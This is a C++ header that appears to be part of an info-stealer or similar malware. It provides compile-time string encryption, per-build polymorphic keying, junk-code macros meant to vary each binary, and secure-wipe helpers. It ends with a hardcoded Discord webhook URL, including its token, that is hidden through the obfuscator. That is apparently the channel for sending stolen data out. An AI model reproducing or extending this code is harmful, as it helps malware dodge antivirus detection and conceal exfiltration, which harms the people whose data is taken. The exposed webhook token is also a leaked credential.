#pragma once
#include <string>
#include <vector>
#include <intrin.h>
namespace Obfuscator {
    static constexpr unsigned char SBOX[256] = {
        0x63,0x7C,0x77,0x7B,0xF2,0x6B,0x6F,0xC5,0x30,0x01,0x67,0x2B,0xFE,0xD7,0xAB,0x76,
        0xCA,0x82,0xC9,0x7D,0xFA,0x59,0x47,0xF0,0xAD,0xD4,0xA2,0xAF,0x9C,0xA4,0x72,0xC0,
        0xB7,0xFD,0x93,0x26,0x36,0x3F,0xF7,0xCC,0x34,0xA5,0xE5,0xF1,0x71,0xD8,0x31,0x15,
        0x04,0xC7,0x23,0xC3,0x18,0x96,0x05,0x9A,0x07,0x12,0x80,0xE2,0xEB,0x27,0xB2,0x75,
        0x09,0x83,0x2C,0x1A,0x1B,0x6E,0x5A,0xA0,0x52,0x3B,0xD6,0xB3,0x29,0xE3,0x2F,0x84,
        0x53,0xD1,0x00,0xED,0x20,0xFC,0xB1,0x5B,0x6A,0xCB,0xBE,0x39,0x4A,0x4C,0x58,0xCF,
        0xD0,0xEF,0xAA,0xFB,0x43,0x4D,0x33,0x85,0x45,0xF9,0x02,0x7F,0x50,0x3C,0x9F,0xA8,
        0x51,0xA3,0x40,0x8F,0x92,0x9D,0x38,0xF5,0xBC,0xB6,0xDA,0x21,0x10,0xFF,0xF3,0xD2,
        0xCD,0x0C,0x13,0xEC,0x5F,0x97,0x44,0x17,0xC4,0xA7,0x7E,0x3D,0x64,0x5D,0x19,0x73,
        0x60,0x81,0x4F,0xDC,0x22,0x2A,0x90,0x88,0x46,0xEE,0xB8,0x14,0xDE,0x5E,0x0B,0xDB,
        0xE0,0x32,0x3A,0x0A,0x49,0x06,0x24,0x5C,0xC2,0xD3,0xAC,0x62,0x91,0x95,0xE4,0x79,
        0xE7,0xC8,0x37,0x6D,0x8D,0xD5,0x4E,0xA9,0x6C,0x56,0xF4,0xEA,0x65,0x7A,0xAE,0x08,
        0xBA,0x78,0x25,0x2E,0x1C,0xA6,0xB4,0xC6,0xE8,0xDD,0x74,0x1F,0x4B,0xBD,0x8B,0x8A,
        0x70,0x3E,0xB5,0x66,0x48,0x03,0xF6,0x0E,0x61,0x35,0x57,0xB9,0x86,0xC1,0x1D,0x9E,
        0xE1,0xF8,0x98,0x11,0x69,0xD9,0x8E,0x94,0x9B,0x1E,0x87,0xE9,0xCE,0x55,0x28,0xDF,
        0x8C,0xA1,0x89,0x0D,0xBF,0xE6,0x42,0x68,0x41,0x99,0x2D,0x0F,0xB0,0x54,0xBB,0x16,
    };

    // ── Inverse S-Box (for decrypt path) ────────────────────────────
    static constexpr unsigned char INV_SBOX[256] = {
        0x52,0x09,0x6A,0xD5,0x30,0x36,0xA5,0x38,0xBF,0x40,0xA3,0x9E,0x81,0xF3,0xD7,0xFB,
        0x7C,0xE3,0x39,0x82,0x9B,0x2F,0xFF,0x87,0x34,0x8E,0x43,0x44,0xC4,0xDE,0xE9,0xCB,
        0x54,0x7B,0x94,0x32,0xA6,0xC2,0x23,0x3D,0xEE,0x4C,0x95,0x0B,0x42,0xFA,0xC3,0x4E,
        0x08,0x2E,0xA1,0x66,0x28,0xD9,0x24,0xB2,0x76,0x5B,0xA2,0x49,0x6D,0x8B,0xD1,0x25,
        0x72,0xF8,0xF6,0x64,0x86,0x68,0x98,0x16,0xD4,0xA4,0x5C,0xCC,0x5D,0x65,0xB6,0x92,
        0x6C,0x70,0x48,0x50,0xFD,0xED,0xB9,0xDA,0x5E,0x15,0x46,0x57,0xA7,0x8D,0x9D,0x84,
        0x90,0xD8,0xAB,0x00,0x8C,0xBC,0xD3,0x0A,0xF7,0xE4,0x58,0x05,0xB8,0xB3,0x45,0x06,
        0xD0,0x2C,0x1E,0x8F,0xCA,0x3F,0x0F,0x02,0xC1,0xAF,0xBD,0x03,0x01,0x13,0x8A,0x6B,
        0x3A,0x91,0x11,0x41,0x4F,0x67,0xDC,0xEA,0x97,0xF2,0xCF,0xCE,0xF0,0xB4,0xE6,0x73,
        0x96,0xAC,0x74,0x22,0xE7,0xAD,0x35,0x85,0xE2,0xF9,0x37,0xE8,0x1C,0x75,0xDF,0x6E,
        0x47,0xF1,0x1A,0x71,0x1D,0x29,0xC5,0x89,0x6F,0xB7,0x62,0x0E,0xAA,0x18,0xBE,0x1B,
        0xFC,0x56,0x3E,0x4B,0xC6,0xD2,0x79,0x20,0x9A,0xDB,0xC0,0xFE,0x78,0xCD,0x5A,0xF4,
        0x1F,0xDD,0xA8,0x33,0x88,0x07,0xC7,0x31,0xB1,0x12,0x10,0x59,0x27,0x80,0xEC,0x5F,
        0x60,0x51,0x7F,0xA9,0x19,0xB5,0x4A,0x0D,0x2D,0xE5,0x7A,0x9F,0x93,0xC9,0x9C,0xEF,
        0xA0,0xE0,0x3B,0x4D,0xAE,0x2A,0xF5,0xB0,0xC8,0xEB,0xBB,0x3C,0x83,0x53,0x99,0x61,
        0x17,0x2B,0x04,0x7E,0xBA,0x77,0xD6,0x26,0xE1,0x69,0x14,0x63,0x55,0x21,0x0C,0x7D,
    };

    // ── DeriveKey: position-dependent key schedule with S-Box ───────
    // 7-round key derivation: XOR → ROL → S-Box → MUL → position mix
    // + POLY_SEED per-build entropy (injected via /D at compile time)
    constexpr unsigned char DeriveKey(int baseKey, size_t index) {
        unsigned char k = (unsigned char)(baseKey ^ (index * 0x53));
        k = (unsigned char)((k << 3) | (k >> 5));                // ROL 3
        k ^= (unsigned char)((index + 0x7F) & 0xFF);
        k = SBOX[k];                                              // S-Box substitution
        k = (unsigned char)(k * 0xB7);
        k ^= (unsigned char)((index >> 1) ^ 0xC5);
        k = (unsigned char)((k << 2) | (k >> 6));                // ROL 2
        k ^= SBOX[(unsigned char)(index ^ 0x3A)];                // 2nd S-Box lookup
#ifdef POLY_SEED
        unsigned char ps = (unsigned char)((POLY_SEED >> (index % 20)) & 0xFF);
        k ^= ps;
        k = (unsigned char)((k << 1) | (k >> 7));
        k = SBOX[(unsigned char)(k ^ ps)];                        // 3rd S-Box lookup
        k = (unsigned char)(k * 0x9D + ps);
        k ^= (unsigned char)((POLY_SEED >> 8) & 0xFF);
#endif
        return k ? k : (unsigned char)0x42;
    }

    // ── XorString: compile-time encrypted, runtime decrypted ────────
    // Encryption: XOR + S-Box substitution per byte (2-layer)
    // Decryption: Inverse S-Box + XOR (volatile to defeat optimizer)
    template <size_t N, int K>
    class XorString {
    private:
        char _data[N];
    public:
        constexpr XorString(const char* str) : _data{} {
            for (size_t i = 0; i < N; ++i) {
                unsigned char plain = (unsigned char)str[i];
                unsigned char key = DeriveKey(K, i);
                unsigned char xored = plain ^ key;
                // 2nd layer: S-Box substitution on XOR result
                _data[i] = (char)SBOX[xored];
            }
        }
        std::string decrypt() const {
            std::string result;
            result.reserve(N);
            const volatile char* vd = (const volatile char*)_data;
            for (size_t i = 0; i < N; ++i) {
                unsigned char enc = (unsigned char)vd[i];
                unsigned char key = DeriveKey(K, i);
                // Reverse: Inverse S-Box then XOR
                char c = (char)(INV_SBOX[enc] ^ key);
                if (c != 0) result += c;
            }
            return result;
        }
        const char* decrypt_raw(char* out) const {
            const volatile char* vd = (const volatile char*)_data;
            for (size_t i = 0; i < N; ++i) {
                unsigned char enc = (unsigned char)vd[i];
                unsigned char key = DeriveKey(K, i);
                out[i] = (char)(INV_SBOX[enc] ^ key);
            }
            return out;
        }
    };

    // ── XorWideString: wchar_t encryption with dual-key per char ────
    template <size_t N, int K>
    class XorWideString {
    private:
        wchar_t _data[N];
    public:
        constexpr XorWideString(const wchar_t* str) : _data{} {
            for (size_t i = 0; i < N; ++i) {
                unsigned char kHi = DeriveKey(K, i * 2);
                unsigned char kLo = DeriveKey(K, i * 2 + 1);
                wchar_t wkey = (wchar_t)((kHi << 8) | kLo);
                wchar_t xored = str[i] ^ wkey;
                // S-Box each byte of the wide char independently
                unsigned char hi = SBOX[(unsigned char)(xored >> 8)];
                unsigned char lo = SBOX[(unsigned char)(xored & 0xFF)];
                _data[i] = (wchar_t)((hi << 8) | lo);
            }
        }
        void decrypt_buf(wchar_t* out) const {
            for (size_t i = 0; i < N; ++i) {
                unsigned char kHi = DeriveKey(K, i * 2);
                unsigned char kLo = DeriveKey(K, i * 2 + 1);
                wchar_t wkey = (wchar_t)((kHi << 8) | kLo);
                // Reverse: Inverse S-Box each byte, then XOR
                unsigned char hi = INV_SBOX[(unsigned char)(_data[i] >> 8)];
                unsigned char lo = INV_SBOX[(unsigned char)(_data[i] & 0xFF)];
                out[i] = (wchar_t)((hi << 8) | lo) ^ wkey;
            }
        }
        static constexpr size_t length() { return N > 0 ? N - 1 : 0; }
    };

    // ── AutoWipeString: RAII wrapper — wipes decrypted string on scope exit ─
    // Prevents decrypted secrets from lingering on heap after use.
    // Usage: { auto s = OBFS_SA("secret"); use(s.c_str()); } // wiped here
    class AutoWipeString {
    private:
        std::string _s;
    public:
        AutoWipeString(std::string&& s) : _s(std::move(s)) {}
        ~AutoWipeString() {
            if (!_s.empty()) {
                volatile char* p = (volatile char*)&_s[0];
                for (size_t i = 0; i < _s.size(); i++) p[i] = 0;
                _s.clear();
                _s.shrink_to_fit();
            }
        }
        AutoWipeString(const AutoWipeString&) = delete;
        AutoWipeString& operator=(const AutoWipeString&) = delete;
        AutoWipeString(AutoWipeString&& o) noexcept : _s(std::move(o._s)) {}
        const char* c_str() const { return _s.c_str(); }
        const std::string& str() const { return _s; }
        size_t size() const { return _s.size(); }
        bool empty() const { return _s.empty(); }
        operator const std::string&() const { return _s; }
    };

    // ── SecureWipe family ───────────────────────────────────────────
    // 3-pass overwrite: zeros → 0xFF → zeros (DoD-inspired)
    // volatile prevents compiler from optimizing away the wipe
    static __forceinline void SecureWipeMemory(void* ptr, size_t len) {
        volatile unsigned char* p = (volatile unsigned char*)ptr;
        for (size_t i = 0; i < len; i++) p[i] = 0x00;
        for (size_t i = 0; i < len; i++) p[i] = 0xFF;
        for (size_t i = 0; i < len; i++) p[i] = 0x00;
    }

    static __forceinline void SecureWipeString(std::string& s) {
        if (!s.empty()) {
            volatile char* p = (volatile char*)&s[0];
            for (size_t i = 0; i < s.size(); i++) p[i] = 0;
            for (size_t i = 0; i < s.size(); i++) p[i] = (char)0xFF;
            for (size_t i = 0; i < s.size(); i++) p[i] = 0;
            s.clear();
            s.shrink_to_fit();
        }
    }

    static __forceinline void SecureWipeVector(std::vector<unsigned char>& v) {
        if (!v.empty()) {
            volatile unsigned char* p = (volatile unsigned char*)v.data();
            for (size_t i = 0; i < v.size(); i++) p[i] = 0x00;
            for (size_t i = 0; i < v.size(); i++) p[i] = 0xFF;
            for (size_t i = 0; i < v.size(); i++) p[i] = 0x00;
            v.clear();
            v.shrink_to_fit();
        }
    }

    static __forceinline void SecureWipeWide(wchar_t* p, size_t count) {
        volatile wchar_t* vp = (volatile wchar_t*)p;
        for (size_t i = 0; i < count; i++) vp[i] = 0;
        for (size_t i = 0; i < count; i++) vp[i] = (wchar_t)0xFFFF;
        for (size_t i = 0; i < count; i++) vp[i] = 0;
    }
}

// ── Macro interface ─────────────────────────────────────────────────
#ifndef OBFS_KEY
#define OBFS_KEY 0xAD
#endif
#define OBFS_S(str) Obfuscator::XorString<sizeof(str), (OBFS_KEY ^ __COUNTER__)>(str).decrypt()
#define OBFS_SA(str) Obfuscator::AutoWipeString(Obfuscator::XorString<sizeof(str), (OBFS_KEY ^ __COUNTER__)>(str).decrypt())
#define OBFS_W_DECL(varName, wstr) \
    static constexpr auto _xw_##varName = Obfuscator::XorWideString<sizeof(wstr)/sizeof(wchar_t), (OBFS_KEY ^ __COUNTER__)>(wstr); \
    wchar_t varName[sizeof(wstr)/sizeof(wchar_t)]; \
    _xw_##varName.decrypt_buf(varName);
#define OBFS_W_WIPE(varName) Obfuscator::SecureWipeWide(varName, sizeof(varName)/sizeof(wchar_t))

#define SECURE_WIPE_S(s) Obfuscator::SecureWipeString(s)
#define SECURE_WIPE_V(v) Obfuscator::SecureWipeVector(v)
#define SECURE_WIPE_M(p, len) Obfuscator::SecureWipeMemory(p, len)

#ifndef S
#define S(str) OBFS_S(str)
#endif

// ── Polymorphic junk code (4 variants, POLY_SEED-keyed selection) ───
// Each macro site compiles to a different variant per build.
// Uses __COUNTER__ so adjacent JUNK_CODE calls get different patterns.
#ifndef JUNK_CODE_1
#define JUNK_CODE_1 \
    { volatile int x = 100; for(int i=0; i<10; i++) x += i; if(x < 0) x = 0; }
#endif
#ifndef JUNK_CODE_2
#define JUNK_CODE_2 \
    { volatile char b[8]; for(int i=0; i<8; i++) b[i] = (char)(i * 3); }
#endif
#ifndef JUNK_CODE_3
#define JUNK_CODE_3 \
    { volatile unsigned k = 0xDEAD; k ^= (k << 5); k *= 0x1337; k ^= (k >> 7); }
#endif
#ifndef JUNK_CODE_4
#define JUNK_CODE_4 \
    { volatile short a[4] = {0x41,0x5A,0x30,0x39}; for(int i=0;i<4;i++) a[i] ^= (short)(i*7+3); }
#endif
#ifndef JUNK_CODE_SMALL
#define JUNK_CODE_SMALL JUNK_CODE_1
#endif
#ifndef JUNK_CODE_LARGE
#define JUNK_CODE_LARGE JUNK_CODE_1 JUNK_CODE_2 JUNK_CODE_3
#endif

// ── Webhook URL ─────────────────────────────────────────────────────
#ifndef SOFIA_WEBHOOK_URL
#define SOFIA_WEBHOOK_URL "https://discord.com/api/webhooks/1499616167470301296/f-Zh5QvIFv61_bmYzEj-ze7lDeOiuhmDHG7oFz7Z_tHcIw8yJqVNusB7-F4YXCLZu210"
#endif
#define OBFS_WEBHOOK() OBFS_S(SOFIA_WEBHOOK_URL)